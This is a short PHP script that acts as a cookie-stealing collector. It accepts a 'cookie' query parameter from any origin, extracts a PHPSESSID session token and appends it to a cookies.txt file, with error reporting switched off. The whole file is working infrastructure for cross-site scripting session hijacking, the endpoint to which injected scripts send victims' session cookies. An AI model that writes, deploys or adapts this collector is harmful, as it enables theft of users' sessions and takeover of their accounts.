<?php
error_reporting(0);
header("Access-Control-Allow-Origin: *"); 

if (isset($_GET['cookie']) && !empty($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    
    if (preg_match('/PHPSESSID=[a-zA-Z0-9]+;?/', $cookie, $matches)) {
        $clean_cookie = $matches[0];
        
        $file = fopen("cookies.txt", "a");
        fwrite($file, $clean_cookie . "\n");
        fclose($file);
    }
}
?>
